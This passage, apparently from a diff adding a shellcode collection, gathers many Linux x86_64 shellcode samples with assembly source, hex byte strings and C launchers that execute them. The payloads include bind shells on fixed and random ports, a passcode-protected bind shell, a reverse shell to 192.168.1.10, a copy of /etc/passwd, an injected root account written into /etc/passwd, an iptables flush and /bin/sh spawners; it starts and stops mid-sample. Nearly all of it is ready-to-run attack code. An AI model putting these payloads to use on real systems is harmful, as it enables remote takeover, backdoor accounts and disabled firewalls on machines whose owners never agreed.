+   mov rdx, rsp
+   push rdi 
+   mov rsi, rsp
+   add al, 0x3b
+   syscall
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+// 138 bytes 
+unsigned char code[] =\
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05"
+"\x48\x97\xc7\x44\x24\xfc"
+"\xc0\xa8\x01\x09\x66\xc7\x44\x24\xfa"
+"\x11\x5c" //port big endiant
+"\xc6\x44\x24\xf8\x02\x48\x83"
+"\xec\x08\x6a\x2a\x58\x48\x89\xe6\x6a\x10\x5a\x0f"
+"\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05"
+"\x75\xf6\x48\x89\xc7\x99\x88\x44\x24\xff\x48\x83"
+"\xec\x01\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10\x0f"
+"\x05\x48\xb8\x64\x6f\x6f\x6d\x65\x64\x72\x61\x57"
+"\x48\x8d\x3e\x48\xaf\x74\x05\x6a\x3c\x58\x0f\x05"
+"\x5f\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
+"\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48"
+"\x89\xe6\x04\x3b\x0f\x05";
+
+main()
+{
+   printf("Shellcode Length: %d\n", (int)strlen(code));
+   int (*ret)() = (int(*)())code;
+   ret();
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+;Author - Andriy Brukhovetskyy - doomedraven - SLAEx64 - 1322
+;175 bytes
+;http://www.doomedraven.com/2014/05/slaex64-shellbindtcp-with-passcode.html
+
+global _start
+section .text
+_start:
+    push byte 0x29 ; 41 - socket syscall 
+    pop rax
+    push byte 0x02 ; AF_INET
+    pop rdi 
+    push byte 0x01 ; SOCK_STREAM
+    pop rsi
+    cdq
+    syscall
+    
+    ;copy socket descriptor to rdi for future use
+    ;bind
+    xchg rdi, rax
+    xor rax, rax
+    mov dword [rsp-4], eax    ;INADDR_ANY
+    mov word  [rsp-6], 0x5c11 ;PORT 4444
+    mov byte  [rsp-8], 0x2    ;AF_INET
+    sub rsp, 0x8
+    
+    push byte 0x31 ;49 bind
+    pop rax 
+    mov rsi, rsp
+    cdq
+    add dl, 16 ;len
+    syscall
+    
+    ;listen
+    push byte 0x32 ;listen
+    pop rax
+    ;push byte 0x02 ;max clients
+    ;pop rsi
+    syscall
+     
+    push byte 0x2b ; accept
+    pop rax
+    sub rsp, 0x10  ; adjust
+    xor rsi, rsi    
+    mov rsi, rsp ; pointer
+    mov byte [rsp-1], 0x10 ;len
+    sub rsp, 0x01   ; adjust
+    cdq
+    mov rdx, rsp ; pointer
+    syscall
+        
+    ;read buffer
+    mov rdi, rax ; socket
+    xor rax, rax
+    mov byte [rsp-1], al ;0 read
+    sub rsp, 1
+    cdq      
+    push rdx ; 0 stdin
+    lea rsi, [rsp-0x10] ; 16 bytes from buffer
+    add dl, 0x10        ; len
+    syscall
+    
+    ;test passcode
+    mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
+    push rdi                    ; save the socket
+    lea rdi, [rsi]              ; load string from address
+    scasq                       ; compare
+    jz accepted_passwd          ; jump if equal
+    
+    ;exit if different :P
+    xor rax, rax 
+    add al, 60
+    syscall
+
+accepted_passwd:
+
+    pop rdi; socket
+    push byte 0x03
+    pop rsi
+
+dup2_loop:
+    dec rsi
+    push byte 0x21
+    pop rax
+    syscall
+    jnz dup2_loop ; jump if not 0
+
+    push rsi; 0
+    
+    ;execve
+    ;push /bin//sh in reverse
+    mov rbx, 0x68732f2f6e69622f
+    push rbx
+    
+    mov rdi, rsp
+    push rsi
+    
+    mov rdx, rsp
+    push rdi 
+    
+    mov rsi, rsp
+    push byte 0x3b
+    pop rax
+    syscall
+    
+*/
+        
+#include <stdio.h>
+#include <string.h>
+
+// 175 bytes 
+unsigned char code[] =\
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05"
+"\x48\x97\x48\x31\xc0\x89\x44\x24\xfc\x66\xc7\x44"
+"\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec"
+"\x08\x6a\x31\x58\x48\x89\xe6\x99\x80\xc2\x10\x0f"
+"\x05\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x48\x83\xec"
+"\x10\x48\x31\xf6\x48\x89\xe6\xc6\x44\x24\xff\x10"
+"\x48\x83\xec\x01\x99\x48\x89\xe2\x0f\x05\x48\x89"
+"\xc7\x48\x31\xc0\x88\x44\x24\xff\x48\x83\xec\x01"
+"\x99\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10\x0f\x05"
+"\x48\xb8\x64\x6f\x6f\x6d\x65\x64\x72\x61\x57\x48"
+"\x8d\x3e\x48\xaf\x74\x07\x48\x31\xc0\x04\x3c\x0f"
+"\x05\x5f\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f"
+"\x05\x75\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
+"\x73\x68\x53\x48\x89\xe7\x56\x48\x89\xe2\x57\x48"
+"\x89\xe6\x6a\x3b\x58\x0f\x05";
+
+main()
+{
+    printf("Shellcode Length: %d\n", (int)strlen(code));
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+Reads data from /etc/passwd to /tmp/outfile
+No null bytes
+ 
+Author: Chris Higgins <chris@chigs.me>
+        @ch1gg1ns -- github.com/chiggins
+        chigstuff.com
+Date:   3-27-2014
+Size:   118 bytes
+Tested: ArchLinux x86_64 3.13.6-1
+Assembly:
+        xor rax, rax
+        mov al, 2
+        xor rdi, rdi
+        mov rbx, 0x647773
+        push rbx
+        mov rbx, 0x7361702f6374652f
+        push rbx
+        lea rdi, [rsp]
+        xor rsi, rsi
+        syscall
+        mov rbx, rax
+        xor rax, rax
+        mov rdi, rbx
+        mov rsi, rsp
+        mov dx, 0xFFFF
+        syscall
+        mov r8, rax
+        mov rax, rsp
+        xor rbx, rbx
+        push rbx
+        mov rbx, 0x656c6966
+        push rbx
+        mov rbx, 0x74756f2f706d742f
+        push rbx
+        mov rbx, rax
+        xor rax, rax
+        mov al, 2
+        lea rdi, [rsp]
+        xor rsi, rsi
+        push 0x66
+        pop si
+        syscall
+        mov rdi, rax
+        xor rax, rax
+        mov al, 1
+        lea rsi, [rbx]
+        xor rdx, rdx
+        mov rdx, r8
+        syscall
+*/
+ 
+#include <stdio.h>
+#include <string.h>
+ 
+char shellcode[] = "\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48\xbb\x2f\x65\x74\x63\x70\x61\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05";
+ 
+int main() {
+    printf("len: %d bytes", sizeof shellcode);
+    (*(void (*)()) shellcode);
+    return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+
+ Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
+ Copyright (C) 2013 Geyslan G. Bem, Hacking bits
+
+   http://hackingbits.com
+   geyslan@gmail.com
+
+ This program is free software: you can redistribute it and/or modify
+ it under the terms of the GNU General Public License as published by
+ the Free Software Foundation, either version 3 of the License, or
+ (at your option) any later version.
+
+ This program is distributed in the hope that it will be useful,
+ but WITHOUT ANY WARRANTY; without even the implied warranty of
+ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ GNU General Public License for more details.
+
+ You should have received a copy of the GNU General Public License
+ along with this program.  If not, see <http://www.gnu.org/licenses/>
+
+*/
+
+
+/*
+
+   shell_bind_tcp_random_port_shellcode_x86_64
+     assembly source: https://github.com/geyslan/SLAE/blob/master/improvements/shell_bind_tcp_random_port_x86_64.asm
+
+   * 57 bytes
+   * null-free
+
+
+   # gcc -m64 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode_x86_64.c -o shell_bind_tcp_random_port_shellcode_x86_64
+
+   Testing
+   # ./shell_bind_tcp_random_port_shellcode_x86_64
+   # netstat -anp | grep shell
+   # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
+   # nc 127.0.0.1 port
+
+*/
+
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+
+"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02"
+"\x5f\xb0\x29\x0f\x05\x52\x5e\x50\x5f\xb0"
+"\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
+"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52"
+"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+"\x57\x54\x5f\xb0\x3b\x0f\x05";
+
+main ()
+{
+
+    // When contains null bytes, printf will show a wrong shellcode length.
+
+    printf("Shellcode Length:  %d\n", strlen(code));
+
+    // Pollutes all registers ensuring that the shellcode runs in any circumstance.
+
+    __asm__ ("mov $0xffffffffffffffff, %rax\n\t"
+         "mov %rax, %rbx\n\t"
+         "mov %rax, %rcx\n\t"
+         "mov %rax, %rdx\n\t"
+         "mov %rax, %rsi\n\t"
+         "mov %rax, %rdi\n\t"
+         "mov %rax, %rbp\n\t"
+
+    // Calling the shellcode
+         "call code");
+
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+Title   : tcpbindshell  (150 bytes)
+Date    : 04 October 2013
+Author  : Russell Willis <codinguy@gmail.com>
+Testd on: Linux/x86_64 (SMP Debian 3.2.46-1+deb7u1 x86_64 GNU/Linux)
+
+$ objdump -D tcpbindshell -M intel
+tcpbindshell:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:   48 31 c0                xor    rax,rax
+  400083:   48 31 ff                xor    rdi,rdi
+  400086:   48 31 f6                xor    rsi,rsi
+  400089:   48 31 d2                xor    rdx,rdx
+  40008c:   4d 31 c0                xor    r8,r8
+  40008f:   6a 02                   push   0x2
+  400091:   5f                      pop    rdi
+  400092:   6a 01                   push   0x1
+  400094:   5e                      pop    rsi
+  400095:   6a 06                   push   0x6
+  400097:   5a                      pop    rdx
+  400098:   6a 29                   push   0x29
+  40009a:   58                      pop    rax
+  40009b:   0f 05                   syscall 
+  40009d:   49 89 c0                mov    r8,rax
+  4000a0:   4d 31 d2                xor    r10,r10
+  4000a3:   41 52                   push   r10
+  4000a5:   41 52                   push   r10
+  4000a7:   c6 04 24 02             mov    BYTE PTR [rsp],0x2
+  4000ab:   66 c7 44 24 02 7a 69    mov    WORD PTR [rsp+0x2],0x697a
+  4000b2:   48 89 e6                mov    rsi,rsp
+  4000b5:   41 50                   push   r8
+  4000b7:   5f                      pop    rdi
+  4000b8:   6a 10                   push   0x10
+  4000ba:   5a                      pop    rdx
+  4000bb:   6a 31                   push   0x31
+  4000bd:   58                      pop    rax
+  4000be:   0f 05                   syscall 
+  4000c0:   41 50                   push   r8
+  4000c2:   5f                      pop    rdi
+  4000c3:   6a 01                   push   0x1
+  4000c5:   5e                      pop    rsi
+  4000c6:   6a 32                   push   0x32
+  4000c8:   58                      pop    rax
+  4000c9:   0f 05                   syscall 
+  4000cb:   48 89 e6                mov    rsi,rsp
+  4000ce:   48 31 c9                xor    rcx,rcx
+  4000d1:   b1 10                   mov    cl,0x10
+  4000d3:   51                      push   rcx
+  4000d4:   48 89 e2                mov    rdx,rsp
+  4000d7:   41 50                   push   r8
+  4000d9:   5f                      pop    rdi
+  4000da:   6a 2b                   push   0x2b
+  4000dc:   58                      pop    rax
+  4000dd:   0f 05                   syscall 
+  4000df:   59                      pop    rcx
+  4000e0:   4d 31 c9                xor    r9,r9
+  4000e3:   49 89 c1                mov    r9,rax
+  4000e6:   4c 89 cf                mov    rdi,r9
+  4000e9:   48 31 f6                xor    rsi,rsi
+  4000ec:   6a 03                   push   0x3
+  4000ee:   5e                      pop    rsi
+00000000004000ef <doop>:
+  4000ef:   48 ff ce                dec    rsi
+  4000f2:   6a 21                   push   0x21
+  4000f4:   58                      pop    rax
+  4000f5:   0f 05                   syscall 
+  4000f7:   75 f6                   jne    4000ef <doop>
+  4000f9:   48 31 ff                xor    rdi,rdi
+  4000fc:   57                      push   rdi
+  4000fd:   57                      push   rdi
+  4000fe:   5e                      pop    rsi
+  4000ff:   5a                      pop    rdx
+  400100:   48 bf 2f 2f 62 69 6e    movabs rdi,0x68732f6e69622f2f
+  400107:   2f 73 68 
+  40010a:   48 c1 ef 08             shr    rdi,0x8
+  40010e:   57                      push   rdi
+  40010f:   54                      push   rsp
+  400110:   5f                      pop    rdi
+  400111:   6a 3b                   push   0x3b
+  400113:   58                      pop    rax
+  400114:   0f 05                   syscall 
+
+  Code not is not optimal, this is left as an exercise to the reader ;^)
+  
+*/
+
+#include <stdio.h>
+  
+#define PORT "\x7a\x69" /* 31337 */
+  
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
+"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
+"\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
+PORT"\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
+"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
+"\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
+"\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
+"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
+"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
+"\x5f\x6a\x3b\x58\x0f\x05";
+ 
+int
+main(void)
+{
+    printf("Shellcode Length: %d\n", (int)sizeof(code)-1);
+    int (*ret)() = (int(*)())code;
+    ret();
+    return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+Title   : reversetcpbindshell  (118 bytes)
+Date    : 04 October 2013
+Author  : Russell Willis <codinguy@gmail.com>
+Testd on: Linux/x86_64 (SMP Debian 3.2.46-1+deb7u1 x86_64 GNU/Linux)
+
+$ objdump -D reversetcpbindshell -M intel
+reversetcpbindshell:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:   48 31 c0                xor    rax,rax
+  400083:   48 31 ff                xor    rdi,rdi
+  400086:   48 31 f6                xor    rsi,rsi
+  400089:   48 31 d2                xor    rdx,rdx
+  40008c:   4d 31 c0                xor    r8,r8
+  40008f:   6a 02                   push   0x2
+  400091:   5f                      pop    rdi
+  400092:   6a 01                   push   0x1
+  400094:   5e                      pop    rsi
+  400095:   6a 06                   push   0x6
+  400097:   5a                      pop    rdx
+  400098:   6a 29                   push   0x29
+  40009a:   58                      pop    rax
+  40009b:   0f 05                   syscall 
+  40009d:   49 89 c0                mov    r8,rax
+  4000a0:   48 31 f6                xor    rsi,rsi
+  4000a3:   4d 31 d2                xor    r10,r10
+  4000a6:   41 52                   push   r10
+  4000a8:   c6 04 24 02             mov    BYTE PTR [rsp],0x2
+  4000ac:   66 c7 44 24 02 7a 69    mov    WORD PTR [rsp+0x2],0x697a
+  4000b3:   c7 44 24 04 0a 33 35    mov    DWORD PTR [rsp+0x4],0x435330a
+  4000ba:   04 
+  4000bb:   48 89 e6                mov    rsi,rsp
+  4000be:   6a 10                   push   0x10
+  4000c0:   5a                      pop    rdx
+  4000c1:   41 50                   push   r8
+  4000c3:   5f                      pop    rdi
+  4000c4:   6a 2a                   push   0x2a
+  4000c6:   58                      pop    rax
+  4000c7:   0f 05                   syscall 
+  4000c9:   48 31 f6                xor    rsi,rsi
+  4000cc:   6a 03                   push   0x3
+  4000ce:   5e                      pop    rsi
+00000000004000cf <doop>:
+  4000cf:   48 ff ce                dec    rsi
+  4000d2:   6a 21                   push   0x21
+  4000d4:   58                      pop    rax
+  4000d5:   0f 05                   syscall 
+  4000d7:   75 f6                   jne    4000cf <doop>
+  4000d9:   48 31 ff                xor    rdi,rdi
+  4000dc:   57                      push   rdi
+  4000dd:   57                      push   rdi
+  4000de:   5e                      pop    rsi
+  4000df:   5a                      pop    rdx
+  4000e0:   48 bf 2f 2f 62 69 6e    movabs rdi,0x68732f6e69622f2f
+  4000e7:   2f 73 68 
+  4000ea:   48 c1 ef 08             shr    rdi,0x8
+  4000ee:   57                      push   rdi
+  4000ef:   54                      push   rsp
+  4000f0:   5f                      pop    rdi
+  4000f1:   6a 3b                   push   0x3b
+  4000f3:   58                      pop    rax
+  4000f4:   0f 05                   syscall 
+
+  Code not is not optimal, this is left as an exercise to the reader ;^)
+  
+*/
+
+#include <stdio.h>
+  
+#define IPADDR "\xc0\x80\x10\x0a" /* 192.168.1.10 */
+#define PORT "\x7a\x69" /* 31337 */
+  
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
+"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
+"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
+"\x02"PORT"\xc7\x44\x24\x04"IPADDR"\x48\x89\xe6\x6a\x10"
+"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
+"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
+"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
+"\x5f\x6a\x3b\x58\x0f\x05";
+ 
+int
+main(void)
+{
+    printf("Shellcode Length: %d\n", (int)sizeof(code)-1);
+    int (*ret)() = (int(*)())code;
+    ret();
+    return 0;
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;sc_adduser01.S
+;Arch:          x86_64, Linux
+;
+;Author:        0_o -- null_null
+;           nu11.nu11 [at] yahoo.com
+;Date:          2012-03-05
+;
+;compile an executable: nasm -f elf64 sc_adduser.S
+;           ld -o sc_adduser sc_adduser.o
+;compile an object: nasm -o sc_adduser_obj sc_adduser.S
+;
+;Purpose:       adds user "t0r" with password "Winner" to /etc/passwd
+;executed syscalls:     setreuid, setregid, open, write, close, exit
+;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
+;syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h
+BITS 64
+[SECTION .text]
+global _start
+_start:
+    ;sys_setreuid(uint ruid, uint euid)
+        xor     rax,    rax
+        mov     al,     113                     ;syscall sys_setreuid
+        xor     rbx,    rbx                     ;arg 1 -- set real uid to root
+        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root
+        syscall
+        ;sys_setregid(uint rgid, uint egid)
+        xor     rax,    rax
+        mov     al,     114                     ;syscall sys_setregid
+    xor     rbx,    rbx                     ;arg 1 -- set real uid to root
+        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root
+        syscall
+    ;push all strings on the stack prior to file operations.
+    xor rbx,    rbx
+    mov     ebx,    0x647773FF
+        shr     rbx,    8
+        push    rbx                             ;string \00dws
+        mov     rbx,    0x7361702f6374652f
+        push    rbx                             ;string sap/cte/
+    mov     rbx,    0x0A687361622F6EFF
+        shr     rbx,    8
+        push    rbx                             ;string \00\nhsab/n
+        mov     rbx,    0x69622F3A746F6F72
+        push    rbx                             ;string ib/:toor
+        mov     rbx,    0x2F3A3A303A303A67
+        push    rbx                             ;string /::0:0:g
+    mov rbx,    0x46556B554B587435
+    push    rbx             ;string FUkUKXt5
+    mov rbx,    0x546755333A723074
+    push    rbx             ;string TgU3:r0t
+    ;prelude to doing anything useful...
+    mov rbx,    rsp         ;save stack pointer for later use
+    push    rbp             ;store base pointer to stack so it can be restored later
+    mov rbp,    rsp         ;set base pointer to current stack pointer
+    ;sys_open(char* fname, int flags, int mode)
+    sub rsp,        16
+    mov [rbp - 16], rbx     ;store pointer to "t0r..../bash"
+    mov si,     0x0401      ;arg 2 -- flags
+    mov rdi,        rbx
+    add rdi,        40      ;arg 1 -- pointer to "/etc/passwd"
+    xor rax,        rax
+    mov al,     2       ;syscall sys_open
+    syscall
+    ;sys_write(uint fd, char* buf, uint size)
+    mov [rbp - 4],  eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.
+    mov rcx,        rbx     ;arg 2 -- load rcx with pointer to string "t0r.../bash"
+    xor rdx,        rdx
+    mov dl,     39      ;arg 3 -- load rdx with size of string "t0r.../bash\00"
+    mov rsi,        rcx     ;arg 2 -- move to source index register
+    mov rdi,        rax     ;arg 1 -- move to destination index register
+    xor     rax,            rax
+        mov     al,             1               ;syscall sys_write
+        syscall
+    ;sys_close(uint fd)
+    xor rdi,        rdi
+    mov edi,        [rbp - 4]   ;arg 1 -- load stored file descriptor to destination index register
+    xor rax,        rax
+    mov al,     3       ;syscall sys_close
+    syscall
+    ;sys_exit(int err_code)
+    xor rax,    rax
+    mov al, 60          ;syscall sys_exit
+    xor rbx,    rbx         ;arg 1 -- error code
+    syscall
+;char shellcode[] =
+;   "\x48\x31\xc0\xb0\x71\x48\x31\xdb\x48\x31\xc9\x0f\x05\x48\x31"
+;   "\xc0\xb0\x72\x48\x31\xdb\x48\x31\xc9\x0f\x05\x48\x31\xdb\xbb"
+;   "\xff\x73\x77\x64\x48\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63"
+;   "\x2f\x70\x61\x73\x53\x48\xbb\xff\x6e\x2f\x62\x61\x73\x68\x0a"
+;   "\x48\xc1\xeb\x08\x53\x48\xbb\x72\x6f\x6f\x74\x3a\x2f\x62\x69"
+;   "\x53\x48\xbb\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x53\x48\xbb\x35"
+;   "\x74\x58\x4b\x55\x6b\x55\x46\x53\x48\xbb\x74\x30\x72\x3a\x33"
+;   "\x55\x67\x54\x53\x48\x89\xe3\x55\x48\x89\xe5\x48\x83\xec\x10"
+;   "\x48\x89\x5d\xf0\x66\xbe\x01\x04\x48\x89\xdf\x48\x83\xc7\x28"
+;   "\x48\x31\xc0\xb0\x02\x0f\x05\x89\x45\xfc\x48\x89\xd9\x48\x31"
+;   "\xd2\xb2\x27\x48\x89\xce\x48\x89\xc7\x48\x31\xc0\xb0\x01\x0f"
+;   "\x05\x48\x31\xff\x8b\x7d\xfc\x48\x31\xc0\xb0\x03\x0f\x05\x48"
+;   "\x31\xc0\xb0\x3c\x48\x31\xdb\x0f\x05";
+;
+;equivalent code:
+;
+;char shellcode[] =
+;   "\x48\x31\xc0\xb0\x71\x48\x31\xdb\x48\x89\xd9\x0f\x05\x48\x31"
+;   "\xc0\xb0\x72\x48\x31\xdb\x48\x89\xd9\x0f\x05\x48\x31\xdb\xbb"
+;   "\xff\x73\x77\x64\x48\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63"
+;   "\x2f\x70\x61\x73\x53\x48\xbb\xff\x6e\x2f\x62\x61\x73\x68\x0a"
+;   "\x48\xc1\xeb\x08\x53\x48\xbb\x72\x6f\x6f\x74\x3a\x2f\x62\x69"
+;   "\x53\x48\xbb\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x53\x48\xbb\x35"
+;   "\x74\x58\x4b\x55\x6b\x55\x46\x53\x48\xbb\x74\x30\x72\x3a\x33"
+;   "\x55\x67\x54\x53\x48\x89\xe3\x55\x48\x89\xe5\x48\x83\xec\x10"
+;   "\x48\x89\x5d\xf0\x66\xbe\x01\x04\x48\x89\xdf\x48\x83\xc7\x28"
+;   "\x48\x31\xc0\xb0\x02\x0f\x05\x89\x45\xfc\x48\x89\xd9\x48\x31"
+;   "\xd2\xb2\x27\x48\x89\xce\x48\x89\xc7\x48\x31\xc0\xb0\x01\x0f"
+;   "\x05\x48\x31\xff\x8b\x7d\xfc\x48\x31\xc0\xb0\x03\x0f\x05\x48"
+;   "\x31\xc0\xb0\x3c\x48\x31\xdb\x0f\x05";
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+    Title: Linux/x86-64 - execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL) - 49 bytes
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Fri 09 Jul 2010 03:26:12 PM EEST
+     
+     
+    Source Code (NASM):
+     
+    section .text
+        global _start
+         
+    _start:
+        xor     rax, rax
+        push    rax
+        push    word 0x462d
+        mov     rcx, rsp
+         
+        mov     rbx, 0x73656c626174ffff
+        shr     rbx, 0x10
+        push    rbx
+        mov     rbx, 0x70692f6e6962732f
+        push    rbx
+        mov     rdi, rsp
+         
+        push    rax
+        push    rcx
+        push    rdi
+        mov     rsi, rsp
+         
+        ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
+        mov     al, 0x3b
+        syscall
+*/
+ 
+#include <stdio.h>
+ 
+char shellcode[] = "\x48\x31\xc0\x50\x66\x68\x2d\x46\x48\x89\xe1\x48\xbb\xff\xff"
+                   "\x74\x61\x62\x6c\x65\x73\x48\xc1\xeb\x10\x53\x48\xbb\x2f\x73"
+                   "\x62\x69\x2f\x69\x70\x53\x48\x89\xe7\x50\x51\x57\x48\x89\xe6"
+                   "\xb0\x3b\x0f\x05";
+                    
+int main()
+{
+    printf("Length: %d bytes.\n'", strlen(shellcode));
+    (*(void(*)()) shellcode)();
+     
+    return 0;
+} 
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * Execute /bin/sh - 27 bytes
+ * Dad` <3 baboon
+;rdi            0x4005c4 0x4005c4
+;rsi            0x7fffffffdf40   0x7fffffffdf40
+;rdx            0x0      0x0
+;gdb$ x/s $rdi
+;0x4005c4:        "/bin/sh"
+;gdb$ x/s $rsi
+;0x7fffffffdf40:  "\304\005@"
+;gdb$ x/32xb $rsi
+;0x7fffffffdf40: 0xc4    0x05    0x40    0x00    0x00    0x00    0x00    0x00
+;0x7fffffffdf48: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+;0x7fffffffdf50: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+;0x7fffffffdf58: 0x55    0xb4    0xa5    0xf7    0xff    0x7f    0x00    0x00
+;
+;=> 0x7ffff7aeff20 <execve>:     mov    eax,0x3b
+;   0x7ffff7aeff25 <execve+5>:   syscall 
+;
+
+main:
+    ;mov rbx, 0x68732f6e69622f2f
+    ;mov rbx, 0x68732f6e69622fff
+    ;shr rbx, 0x8
+    ;mov rax, 0xdeadbeefcafe1dea
+    ;mov rbx, 0xdeadbeefcafe1dea
+    ;mov rcx, 0xdeadbeefcafe1dea
+    ;mov rdx, 0xdeadbeefcafe1dea
+    xor eax, eax
+    mov rbx, 0xFF978CD091969DD1
+    neg rbx
+    push rbx
+    ;mov rdi, rsp
+    push rsp
+    pop rdi
+    cdq
+    push rdx
+    push rdi
+    ;mov rsi, rsp
+    push rsp
+    pop rsi
+    mov al, 0x3b
+    syscall
+ */
+
+#include <stdio.h>
+#include <string.h>
+
+char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+int main()
+{
+    printf("len:%d bytes\n", strlen(code));
+    (*(void(*)()) code)();
+    return 0;
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; { Title: Shellcode linux/x86-64 bind-shell with netcat }
+
+; Author    : Gaussillusion
+; Len       : 131 bytes
+; Language  : Nasm
+
+
+
+BITS 64
+xor    	rdx,rdx
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+push 	rcx
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+shr	rbx,0x30
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+shr 	r10,0x20
+push 	r10
+mov	r10,rsp
+
+mov	r9,0x702dffffffffffff
+shr	r9,0x30
+push 	r9
+mov	r9,rsp
+
+mov 	r8,0x6c2dffffffffffff
+shr	r8,0x30
+push 	r8
+mov	r8,rsp
+
+push	rdx  ;push NULL
+push 	rcx  ;push address of 'bin/sh'
+push	rbx  ;push address of '-e'
